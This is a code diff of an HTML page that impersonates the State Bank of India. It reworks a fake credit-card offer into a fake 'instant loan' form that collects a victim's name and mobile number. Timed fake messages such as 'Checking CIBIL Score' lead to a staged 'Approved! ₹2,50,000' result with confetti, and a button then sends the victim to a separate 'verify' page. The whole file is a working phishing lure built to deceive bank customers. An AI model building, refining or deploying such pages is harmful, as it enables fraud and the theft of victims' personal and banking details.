@@ -3,115 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBI Credit Card Apply</title>
+    <title>SBI Online - Official Loan</title>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
-        /* Base Style */
-        * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
-        body { background-color:#f0f0f0; min-height:100vh; }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: sans-serif; }
+        body { background-color:#e9eef2; color: #333; }
 
-        /* Header & Logo */
-        .header { text-align:center; padding:10px 0; background-color:white; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .logo { max-width:100%; height:auto; max-height:100px; display:block; margin:0 auto; }
+        /* SBI Official Header Look */
+        .header { background-color: white; padding: 10px 0; text-align: center; border-bottom: 1px solid #ddd; }
+        .logo { height: 45px; margin-bottom: 10px; }
+        .blue-bar { background-color: #003366; height: 40px; width: 100%; display: flex; align-items: center; padding: 0 15px; position: relative; }
+        .menu-icon { color: white; font-size: 20px; }
 
-        /* Form Container */
-        .container { max-width:460px; margin:25px auto; background-color:white; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1); padding:25px; text-align: center; }
-        .form-header { color:#2c517a; font-size:18px; font-weight:bold; margin-bottom: 20px; border-bottom: 2px solid #87CEEB; padding-bottom: 10px; }
+        /* Main Container */
+        .container { max-width: 420px; margin: 20px auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .title { color: #20639B; font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 25px; text-transform: uppercase; }
+
+        .form-group { margin-bottom: 20px; text-align: left; }
+        label { font-size: 12px; font-weight: bold; color: #666; display: block; margin-bottom: 8px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; outline: none; font-size: 15px; background: #f9f9f9; }
+
+        /* Patla Official Button (Gadha Blue) */
+        .sky-btn { width: 100%; padding: 14px; background-color: #007bb5; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+
+        /* Custom Official Alert Modal (Instead of Browser Alert) */
+        .custom-alert-overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); justify-content:center; align-items:center; z-index: 20000; }
+        .custom-alert-box { background:white; width:85%; max-width:320px; border-radius:12px; overflow:hidden; text-align:center; animation: popUp 0.3s ease; }
+        .alert-body { padding: 25px 20px; font-size: 15px; color: #444; line-height: 1.5; }
+        .alert-btn { width:100%; padding: 15px; border:none; background:#fff; border-top:1px solid #eee; color:#007bb5; font-size:16px; font-weight:bold; cursor:pointer; }
+
+        /* Main Popup (Processing & Result) */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; z-index: 10000; }
+        .modal-box { background: white; padding: 30px; border-radius: 12px; width: 90%; max-width: 350px; text-align: center; position: relative; }
         
-        /* Inputs & Labels */
-        .form-group { text-align: left; margin-bottom: 15px; }
-        label { display:block; font-size:13px; font-weight:bold; color:#333; margin-bottom:5px; }
-        input { width:100%; padding:12px; font-size:15px; border:1px solid #ccc; border-radius:5px; outline:none; }
-        input:focus { border-color:#87CEEB; }
-
-        /* Sky Blue Button */
-        .sky-btn { width:100%; padding:15px; background-color:#87CEEB; color:white; border:none; border-radius:5px; cursor:pointer; font-size:17px; font-weight:bold; transition: 0.3s; }
-        .sky-btn:hover { background-color:#5fbcd3; }
-
-        /* Full Screen Loader */
-        .loader-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; }
-        .spinner { width: 55px; height: 55px; border: 6px solid #f3f3f3; border-top: 6px solid #87CEEB; border-radius: 50%; animation: spin 1s linear infinite; }
+        .spinner { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #007bb5; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .load-text { margin-top: 20px; font-size: 16px; color: #444; font-weight: 500; }
-
-        /* Popup Modal */
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); justify-content: center; align-items: center; z-index: 10000; }
-        .modal-box { background: white; padding: 30px; border-radius: 15px; width: 85%; max-width: 350px; text-align: center; animation: popUp 0.4s ease-out; }
-        @keyframes popUp { from { transform: scale(0.8); opacity:0; } to { transform: scale(1); opacity:1; } }
-        .limit-display { font-size: 30px; font-weight: bold; color: #87CEEB; margin: 15px 0; border: 2px dashed #87CEEB; padding: 10px; border-radius: 8px; }
-
-        /* Footer Image */
-        .footer-img { width:100%; max-width:460px; display:block; margin:20px auto; border-radius: 5px; }
+        
+        .loan-amount { font-size: 32px; font-weight: bold; color: #007bb5; margin: 15px 0; background: #eef7fb; padding: 15px; border-radius: 8px; border: 1px dashed #007bb5; }
+        
+        @keyframes popUp { from { transform:scale(0.8); opacity:0; } to { transform:scale(1); opacity:1; } }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI Logo" class="logo">
+        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" class="logo" alt="SBI">
+        <div class="blue-bar">
+            <span class="menu-icon">☰</span>
+        </div>
     </div>
 
     <div class="container">
-        <div class="form-header">Apply for Credit Card Online</div>
-        
+        <h2 class="title">Apply For Instant Loan</h2>
         <div class="form-group">
-            <label>Full Name*</label>
-            <input type="text" id="custName" placeholder="Enter your name" required>
+            <label>FULL NAME*</label>
+            <input type="text" id="custName" placeholder="Enter Full Name">
         </div>
-
         <div class="form-group">
-            <label>Mobile Number*</label>
-            <input type="number" id="custMobile" placeholder="Enter 10 digit mobile" 
-                   oninput="if(this.value.length > 10) this.value = this.value.slice(0, 10);" required>
+            <label>MOBILE NUMBER*</label>
+            <input type="number" id="custMobile" placeholder="10 Digit Number" oninput="if(this.value.length > 10) this.value = this.value.slice(0, 10);">
         </div>
-
-        <button class="sky-btn" onclick="startProcess()">Apply Now</button>
+        <button class="sky-btn" onclick="startOfficialProcess()">Check My Offer</button>
     </div>
 
-    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" alt="Security Info" class="footer-img">
-
-    <div class="loader-overlay" id="loadingScreen">
-        <div class="spinner"></div>
-        <div class="load-text" id="statusLabel">Checking your eligibility...</div>
+    <div class="custom-alert-overlay" id="errorAlert">
+        <div class="custom-alert-box">
+            <div class="alert-body">Please enter a valid Name and 10-digit Mobile Number.</div>
+            <button class="alert-btn" onclick="closeAlert()">OK</button>
+        </div>
     </div>
 
-    <div class="modal-overlay" id="popupBox">
+    <div class="modal-overlay" id="mainPopup">
         <div class="modal-box">
-            <h2 style="color: #2ecc71;">Congratulations!</h2>
-            <p style="margin-top:10px;">Hi <strong id="displayName" style="color:#2c517a;"></strong>,</p>
-            <p>You are eligible for a Credit Card!</p>
-            <div class="limit-display">Limit: ₹60,000</div>
-            <button class="sky-btn" onclick="redirectToVerify()">Verify</button>
+            <div id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top:15px; color:#666;" id="statusMsg">Verifying Account...</p>
+            </div>
+            <div id="result" style="display:none;">
+                <h2 style="color:#2ecc71;">Approved!</h2>
+                <p style="margin:10px 0;">Congratulations <strong id="resName"></strong>!</p>
+                <div class="loan-amount">₹2,50,000</div>
+                <button class="sky-btn" onclick="window.location.href='mypages.html'">Proceed To Verify</button>
+            </div>
         </div>
     </div>
 
     <script>
-        function startProcess() {
+        function showAlert() { document.getElementById('errorAlert').style.display = 'flex'; }
+        function closeAlert() { document.getElementById('errorAlert').style.display = 'none'; }
+
+        function startOfficialProcess() {
             const name = document.getElementById('custName').value;
             const mobile = document.getElementById('custMobile').value;
 
-            if (name === "" || mobile.length !== 10) {
-                alert("Bhai, sahi se 10 digit mobile number aur naam daalo!");
+            if (name.trim() === "" || mobile.length !== 10) {
+                showAlert(); // browser alert ki jagah custom alert
                 return;
             }
 
-            const loader = document.getElementById('loadingScreen');
-            const status = document.getElementById('statusLabel');
-            loader.style.display = 'flex';
+            document.getElementById('mainPopup').style.display = 'flex';
+            const status = document.getElementById('statusMsg');
 
-            setTimeout(() => { status.innerText = "Verifying Mobile Number..."; }, 3000);
-            setTimeout(() => { status.innerText = "Checking Bank Records..."; }, 6500);
-            setTimeout(() => { status.innerText = "Allocating Credit Limit..."; }, 9000);
+            setTimeout(() => { status.innerText = "Checking CIBIL Score..."; }, 3000);
+            setTimeout(() => { status.innerText = "Generating Best Offer..."; }, 7000);
 
             setTimeout(() => {
-                loader.style.display = 'none';
-                document.getElementById('displayName').innerText = name;
-                document.getElementById('popupBox').style.display = 'flex';
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('result').style.display = 'block';
+                document.getElementById('resName').innerText = name;
+                
+                confetti({
+                    particleCount: 150,
+                    spread: 70,
+                    origin: { y: 0.6 },
+                    colors: ['#007bb5', '#2ecc71', '#ffeb3b']
+                });
             }, 10000);
         }
-
-        function redirectToVerify() {
-            window.location.href = "mypages.html";
-        }
     </script>
-
 </body>
 </html>
